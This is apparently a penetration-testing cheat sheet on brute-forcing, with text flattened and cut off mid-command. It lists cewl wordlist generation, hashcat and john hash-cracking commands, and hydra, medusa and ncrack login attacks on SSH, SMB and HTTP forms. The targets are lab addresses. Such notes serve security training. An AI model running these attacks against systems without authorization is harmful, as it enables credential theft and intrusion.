# Bruteforcing

irectory Bruteforce Cewl : cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10 ​ -d depth -m minimum word length -w output file --lowercase lowercase all parsed words (optional) Password / Hash Bruteforce Hashcat : ​ // m parameter ​ // hashid match hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt // sha512crypt hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt // MD5(APR) hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt // DES(Unix), Traditional DES, DEScrypt hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Unix) hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt // Wordpress John : john hashfile --wordlist=/home/kali/Desktop/rockyou.txt --format=raw-md5 Online tools : ​

```
LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults
```

​

```
MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher
```

​ (MD5) ​

```
 (MD5)
```

Protocols Bruteforce Hydra TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA Medusa AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form Ncrack (Fastest) RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet SSH ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10: -T5 hydra -L users.txt -P pass.txt 192.168.0.114 ssh Wordlist // For removing duplications in wordlist cat wordlist.txt| sort | uniq > new\_word.txt&#x20;

SMB : ncrack -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb -v&#x20;

HTTP Post hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:us
